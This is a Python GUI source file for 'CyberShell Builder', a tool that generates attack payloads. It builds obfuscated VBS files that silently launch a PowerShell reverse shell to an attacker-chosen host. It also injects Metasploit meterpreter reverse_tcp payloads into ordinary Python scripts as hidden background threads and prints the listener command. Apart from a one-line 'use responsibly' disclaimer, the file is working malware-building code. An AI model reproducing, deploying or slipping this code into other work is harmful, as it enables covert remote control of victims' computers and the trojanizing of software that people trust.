import os
import random
import string
import subprocess
import re
import base64
import threading
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                             QLineEdit, QPushButton, QTextEdit, QTabWidget, QFileDialog, QMessageBox)
from PyQt6.QtCore import Qt, QSize, QUrl
from PyQt6.QtGui import QFont, QColor, QPalette, QIcon, QAction, QPixmap
from PyQt6.QtNetwork import QNetworkAccessManager, QNetworkRequest

class CyberpunkButton(QPushButton):
    def __init__(self, text, color, icon=None):
        super().__init__(text)
        self.color = color
        self.setFixedHeight(40)
        
        if icon:
            self.setIcon(QIcon(icon))
            self.setIconSize(QSize(16, 16))
        
        self.setStyleSheet(f"""
            QPushButton {{
                background-color: transparent;
                color: {self.color};
                border: 2px solid {self.color};
                border-radius: 5px;
                font-family: 'Consolas';
                font-size: 12px;
                padding: 5px;
            }}
            QPushButton:hover {{
                background-color: {self.color};
                color: #0a0a12;
            }}
            QPushButton:pressed {{
                background-color: #0a0a12;
                color: {self.color};
            }}
            QPushButton:disabled {{
                color: #555555;
                border-color: #555555;
            }}
        """)
        self.setCursor(Qt.CursorShape.PointingHandCursor)

class CyberpunkLineEdit(QLineEdit):
    def __init__(self, placeholder=""):
        super().__init__()
        self.setPlaceholderText(placeholder)
        self.setStyleSheet("""
            QLineEdit {
                background-color: #0a0a12;
                color: #9d6aff;
                border: 1px solid #7b2fff;
                border-radius: 3px;
                padding: 5px;
                font-family: 'Consolas';
                font-size: 12px;
            }
            QLineEdit:focus {
                border: 1px solid #b892ff;
            }
        """)

class CyberpunkTextEdit(QTextEdit):
    def __init__(self):
        super().__init__()
        self.setStyleSheet("""
            QTextEdit {
                background-color: #0a0a12;
                color: #9d6aff;
                border: 1px solid #7b2fff;
                border-radius: 3px;
                padding: 5px;
                font-family: 'Consolas';
                font-size: 12px;
            }
        """)
        self.setReadOnly(True)

class CyberpunkLabel(QLabel):
    def __init__(self, text):
        super().__init__(text)
        self.setStyleSheet("""
            QLabel {
                color: #7b2fff;
                font-family: 'Consolas';
                font-size: 12px;
                font-weight: bold;
            }
        """)

class LogoHeader(QLabel):
    def __init__(self):
        super().__init__()
        self.setFixedHeight(150)
        self.setStyleSheet("""
            QLabel {
                background-color: #0a0a12;
                border-bottom: 2px solid #7b2fff;
            }
        """)
        
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 10, 0, 10)
        layout.setSpacing(5)
        
        self.image_label = QLabel()
        self.image_label.setFixedSize(120, 120)
        self.image_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.image_label.setStyleSheet("""
            QLabel {
                background-color: #7b2fff;
                border-radius: 10px;
                border: 2px solid #9d6aff;
            }
        """)
        
        github_label = QLabel("github.com/KaisarYetiandi")
        github_label.setStyleSheet("""
            QLabel {
                color: #9d6aff;
                font-family: 'Consolas';
                font-size: 11px;
                background-color: transparent;
            }
        """)
        github_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        layout.addWidget(self.image_label, alignment=Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(github_label, alignment=Qt.AlignmentFlag.AlignCenter)
        
        self.network_manager = QNetworkAccessManager()
        self.network_manager.finished.connect(self.on_image_downloaded)
        request = QNetworkRequest(QUrl("https://raw.githubusercontent.com/KaisarYetiandi/CyberShell/refs/heads/main/.github/workflows/image.png"))
        self.network_manager.get(request)

    def on_image_downloaded(self, reply):
        if reply.error():
            return
            
        data = reply.readAll()
        pixmap = QPixmap()
        pixmap.loadFromData(data)
        scaled_pixmap = pixmap.scaled(120, 120, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation)
        self.image_label.setPixmap(scaled_pixmap)
        self.image_label.setStyleSheet("background-color: transparent; border: none;")

class ReverseShellBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CyberShell Builder - EmperorYetiandi")
        self.setWindowIcon(QIcon.fromTheme("terminal"))
        self.setFixedSize(900, 750)
        self.setup_ui()
        self.setup_styles()
        self.create_menu()

    def create_menu(self):
        menu_bar = self.menuBar()
        menu_bar.setStyleSheet("""
            QMenuBar {
                background-color: #0a0a12;
                color: #7b2fff;
                border-bottom: 1px solid #7b2fff;
                font-family: 'Consolas';
                font-size: 12px;
            }
            QMenuBar::item:selected {
                background-color: #7b2fff;
                color: #0a0a12;
            }
            QMenu {
                background-color: #0a0a12;
                color: #7b2fff;
                border: 1px solid #7b2fff;
            }
            QMenu::item:selected {
                background-color: #7b2fff;
                color: #0a0a12;
            }
        """)
        
        file_menu = menu_bar.addMenu("📁 File")
        exit_action = QAction("🚪 Exit", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        help_menu = menu_bar.addMenu("❓ Help")
        about_action = QAction("ℹ️ About", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)

    def setup_styles(self):
        self.setStyleSheet("""
            QMainWindow {
                background-color: #0a0a12;
            }
            QTabWidget::pane {
                border: 1px solid #7b2fff;
                border-radius: 3px;
                background-color: #0a0a12;
                margin-top: 5px;
            }
            QTabBar::tab {
                background-color: #0a0a12;
                color: #7b2fff;
                border: 1px solid #7b2fff;
                padding: 8px;
                font-family: 'Consolas';
                font-size: 12px;
                margin-right: 2px;
            }
            QTabBar::tab:selected {
                background-color: #7b2fff;
                color: #0a0a12;
                font-weight: bold;
            }
            QTabBar::tab:hover:!selected {
                background-color: #1a1a22;
            }
        """)

    def setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        logo_header = LogoHeader()
        main_layout.addWidget(logo_header)

        content_widget = QWidget()
        content_layout = QVBoxLayout(content_widget)
        content_layout.setContentsMargins(20, 10, 20, 20)
        content_layout.setSpacing(15)

        self.tab_widget = QTabWidget()
        content_layout.addWidget(self.tab_widget)
        self.setup_vbs_tab()
        self.setup_injector_tab()

        main_layout.addWidget(content_widget)
        
    def setup_vbs_tab(self):
        vbs_tab = QWidget()
        layout = QVBoxLayout(vbs_tab)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(15)
        
        ip_layout = QHBoxLayout()
        ip_label = CyberpunkLabel("🎯 Target IP/Domain:")
        self.ip_input = CyberpunkLineEdit("e.g., 192.168.1.100 or example.com")
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.ip_input)
        layout.addLayout(ip_layout)
        
        port_layout = QHBoxLayout()
        port_label = CyberpunkLabel("🔌 Target Port:")
        self.port_input = CyberpunkLineEdit("e.g., 4444")
        port_layout.addWidget(port_label)
        port_layout.addWidget(self.port_input)
        layout.addLayout(port_layout)
        
        file_layout = QHBoxLayout()
        file_label = CyberpunkLabel("💾 Output VBS File:")
        self.file_input = CyberpunkLineEdit()
        browse_btn = CyberpunkButton("📁 Browse", "#7b2fff", "folder-open")
        browse_btn.clicked.connect(self.browse_vbs_file)
        file_layout.addWidget(file_label)
        file_layout.addWidget(self.file_input)
        file_layout.addWidget(browse_btn)
        layout.addLayout(file_layout)
        
        button_layout = QHBoxLayout()
        chr_btn = CyberpunkButton("🔣 Generate CHR Method", "#9d6aff", "code")
        chr_btn.clicked.connect(self.generate_chr_method)
        b64_btn = CyberpunkButton("📊 Generate Base64 Method", "#b892ff", "lock")
        b64_btn.clicked.connect(self.generate_b64_method)
        button_layout.addWidget(chr_btn)
        button_layout.addWidget(b64_btn)
        layout.addLayout(button_layout)
        
        self.vbs_output = CyberpunkTextEdit()
        layout.addWidget(self.vbs_output)
        self.tab_widget.addTab(vbs_tab, "📝 VBS Builder")
        
    def setup_injector_tab(self):
        injector_tab = QWidget()
        layout = QVBoxLayout(injector_tab)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(15)
        
        file_layout = QHBoxLayout()
        file_label = CyberpunkLabel("🐍 Python File to Inject:")
        self.py_file_input = CyberpunkLineEdit()
        browse_btn = CyberpunkButton("📁 Browse", "#7b2fff", "folder-open")
        browse_btn.clicked.connect(self.browse_py_file)
        file_layout.addWidget(file_label)
        file_layout.addWidget(self.py_file_input)
        file_layout.addWidget(browse_btn)
        layout.addLayout(file_layout)
        
        ip_layout = QHBoxLayout()
        ip_label = CyberpunkLabel("🌐 LHOST:")
        self.msf_ip_input = CyberpunkLineEdit("e.g., 192.168.1.100")
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.msf_ip_input)
        layout.addLayout(ip_layout)
        
        port_layout = QHBoxLayout()
        port_label = CyberpunkLabel("🔌 LPORT:")
        self.msf_port_input = CyberpunkLineEdit("e.g., 4444")
        port_layout.addWidget(port_label)
        port_layout.addWidget(self.msf_port_input)
        layout.addLayout(port_layout)
        
        inject_btn = CyberpunkButton("💉 Inject Metasploit Payload", "#ff6aff", "bug")
        inject_btn.clicked.connect(self.inject_payload)
        layout.addWidget(inject_btn)
        
        self.injector_output = CyberpunkTextEdit()
        layout.addWidget(self.injector_output)
        self.tab_widget.addTab(injector_tab, "🐍 Python Injector")
        
    def browse_vbs_file(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "💾 Save VBS File", "", "VBS Files (*.vbs)")
        if file_path:
            self.file_input.setText(file_path)
            
    def browse_py_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "📂 Select Python File", "", "Python Files (*.py)")
        if file_path:
            self.py_file_input.setText(file_path)
            
    def validate_ip_or_domain(self, value):
        if not value:
            return False
        ip_pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
        domain_pattern = r"^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$"
        ngrok_pattern = r"^[a-zA-Z0-9\-]+\.tcp\.([a-zA-Z0-9\-]+\.)+[A-Za-z]{2,}$"
        return (re.match(ip_pattern, value) or 
                re.match(domain_pattern, value) or 
                re.match(ngrok_pattern, value))
    
    def validate_port(self, port):
        return port.isdigit() and 1 <= int(port) <= 65535
    
    def powershell_reverse_shell(self, ip, port):
        return (
            f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            "$stream = $client.GetStream();"
            "$writer = New-Object System.IO.StreamWriter($stream);"
            "$buffer = New-Object System.Byte[] 1024;"
            "$encoding = New-Object System.Text.ASCIIEncoding;"
            "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){"
            "$command = $encoding.GetString($buffer, 0, $read);"
            "$output = cmd.exe /c $command 2>&1 | Out-String;"
            "$writer.WriteLine($output);"
            "$writer.Flush()"
            "}"
        )
    
    def obfuscate_chr(self, text):
        return '""' + ''.join([f' & Chr({ord(c)})' for c in text])
    
    def generate_chr_method(self):
        ip = self.ip_input.text()
        port = self.port_input.text()
        filename = self.file_input.text()
        
        if not self.validate_ip_or_domain(ip):
            self.show_error("❌ Invalid IP/Domain")
            return
        if not self.validate_port(port):
            self.show_error("❌ Port must be 1-65535")
            return
        if not filename:
            self.show_error("❌ Please specify output file")
            return
            
        try:
            pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)'
            obf_payload = self.obfuscate_chr(self.powershell_reverse_shell(ip, port))
            vbs = (
                'Set x = CreateObject("WScript.Shell")\n'
                f'x.Run {pwsh} & " -NoP -NonI -W Hidden -Command " & {obf_payload}, 0, False\n'
            )
            
            with open(filename, "w", newline="\r\n") as f:
                f.write(vbs)
                
            self.vbs_output.setPlainText(f"✅ Successfully generated CHR method VBS:\n📁 {filename}\n\n{vbs}")
            self.show_success("✅ VBS file created successfully!")
        except Exception as e:
            self.show_error(f"❌ Error: {str(e)}")
    
    def generate_b64_method(self):
        ip = self.ip_input.text()
        port = self.port_input.text()
        filename = self.file_input.text()
        
        if not self.validate_ip_or_domain(ip):
            self.show_error("❌ Invalid IP/Domain")
            return
        if not self.validate_port(port):
            self.show_error("❌ Port must be 1-65535")
            return
        if not filename:
            self.show_error("❌ Please specify output file")
            return
            
        try:
            payload = self.powershell_reverse_shell(ip, port)
            encoded = base64.b64encode(payload.encode("utf-16le")).decode()
            vbs = (
                'Set shell = CreateObject("Wscript.Shell")\n'
                f'shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {encoded}", 0, False\n'
            )
            
            with open(filename, 'w', newline='\r\n') as f:
                f.write(vbs)
                
            self.vbs_output.setPlainText(f"✅ Successfully generated Base64 method VBS:\n📁 {filename}\n\n{vbs}")
            self.show_success("✅ VBS file created successfully!")
        except Exception as e:
            self.show_error(f"❌ Error: {str(e)}")
    
    def inject_payload(self):
        py_file = self.py_file_input.text()
        lhost = self.msf_ip_input.text()
        lport = self.msf_port_input.text()
        
        if not os.path.isfile(py_file):
            self.show_error(f"❌ File '{py_file}' not found")
            return
        if not self.validate_ip_or_domain(lhost):
            self.show_error("❌ Invalid LHOST")
            return
        if not self.validate_port(lport):
            self.show_error("❌ LPORT must be 1-65535")
            return
            
        try:
            self.injector_output.append("🔧 Creating Metasploit payload...")
            
            result = subprocess.run(
                ["msfvenom", "-p", "python/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            if result.returncode != 0:
                self.show_error(f"❌ Failed to create payload:\n{result.stderr}")
                return
                
            msf_payload = result.stdout.strip().splitlines()
            
            with open(py_file, "r", encoding="utf-8") as f:
                original = f.read()
                
            fn_name = ''.join(random.choices(string.ascii_letters, k=8))
            payload_func = [f"def {fn_name}():\n"]
            for line in msf_payload:
                payload_func.append(f"    {line}\n")
            payload_func.append(f"\nthreading.Thread(target={fn_name}, daemon=True).start()\n\n")
            
            final_code = (
                "import threading\n" +
                ''.join(payload_func) +
                original
            )
            
            output_file = py_file.replace(".py", "_patched.py")
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(final_code)
                
            self.injector_output.append(f"✅ Payload successfully injected to '{output_file}'")
            self.injector_output.append("➡️ Run Metasploit listener: msfconsole -x \"use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit\"")
            self.show_success("✅ Payload injected successfully!")
        except Exception as e:
            self.show_error(f"❌ Error: {str(e)}")
    
    def show_error(self, message):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Icon.Critical)
        msg.setText(message)
        msg.setWindowTitle("❌ Error")
        msg.setStyleSheet("""
            QMessageBox {
                background-color: #0a0a12;
                color: #ff6a6a;
                font-family: 'Consolas';
            }
            QLabel {
                color: #ff6a6a;
            }
            QPushButton {
                background-color: #7b2fff;
                color: #0a0a12;
                border: none;
                padding: 5px 10px;
                font-family: 'Consolas';
                font-weight: bold;
            }
        """)
        msg.exec()
    
    def show_success(self, message):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Icon.Information)
        msg.setText(message)
        msg.setWindowTitle("✅ Success")
        msg.setStyleSheet("""
            QMessageBox {
                background-color: #0a0a12;
                color: #9d6aff;
                font-family: 'Consolas';
            }
            QLabel {
                color: #9d6aff;
            }
            QPushButton {
                background-color: #7b2fff;
                color: #0a0a12;
                border: none;
                padding: 5px 10px;
                font-family: 'Consolas';
                font-weight: bold;
            }
        """)
        msg.exec()
        
    def show_about(self):
        about_text = """
        <h2>🔥 CyberShell Builder 🔥</h2>
        <p>Version: 2.0 (PyQt6)</p>
        <p>Author: KaisarYetiandi</p>
        <p>Support: github.com/KaisarYetiandi</p>
        <p>This tool helps create reverse shell payloads and inject Metasploit payloads into Python scripts.</p>
        <p>Features:</p>
        <ul>
            <li>📝 VBS reverse shell generator (CHR and Base64 methods)</li>
            <li>🐍 Python script injector for Metasploit payloads</li>
            <li>🎨 Modern dark theme UI with cyberpunk aesthetics</li>
        </ul>
        <p><b>⚠️ Use responsibly and only on systems you own or have permission to test.</b></p>
        """
        
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Icon.Information)
        msg.setWindowTitle("ℹ️ About CyberShell Builder")
        msg.setTextFormat(Qt.TextFormat.RichText)
        msg.setText(about_text)
        msg.setStyleSheet("""
            QMessageBox {
                background-color: #0a0a12;
                color: #9d6aff;
                font-family: 'Consolas';
            }
            QLabel {
                color: #9d6aff;
            }
            QPushButton {
                background-color: #7b2fff;
                color: #0a0a12;
                border: none;
                padding: 5px 10px;
                font-family: 'Consolas';
                font-weight: bold;
            }
        """)
        msg.exec()

if __name__ == "__main__":
    app = QApplication([])
    app.setStyle("Fusion")
    
    dark_palette = QPalette()
    dark_palette.setColor(QPalette.ColorRole.Window, QColor(10, 10, 18))
    dark_palette.setColor(QPalette.ColorRole.WindowText, QColor(123, 47, 255))
    dark_palette.setColor(QPalette.ColorRole.Base, QColor(10, 10, 18))
    dark_palette.setColor(QPalette.ColorRole.AlternateBase, QColor(20, 20, 30))
    dark_palette.setColor(QPalette.ColorRole.ToolTipBase, QColor(157, 106, 255))
    dark_palette.setColor(QPalette.ColorRole.ToolTipText, QColor(10, 10, 18))
    dark_palette.setColor(QPalette.ColorRole.Text, QColor(157, 106, 255))
    dark_palette.setColor(QPalette.ColorRole.Button, QColor(10, 10, 18))
    dark_palette.setColor(QPalette.ColorRole.ButtonText, QColor(123, 47, 255))
    dark_palette.setColor(QPalette.ColorRole.BrightText, QColor(255, 106, 255))
    dark_palette.setColor(QPalette.ColorRole.Highlight, QColor(123, 47, 255))
    dark_palette.setColor(QPalette.ColorRole.HighlightedText, QColor(10, 10, 18))
    app.setPalette(dark_palette)
    
    font = QFont("Consolas", 10)
    app.setFont(font)
    
    window = ReverseShellBuilder()
    window.show()
    app.exec()
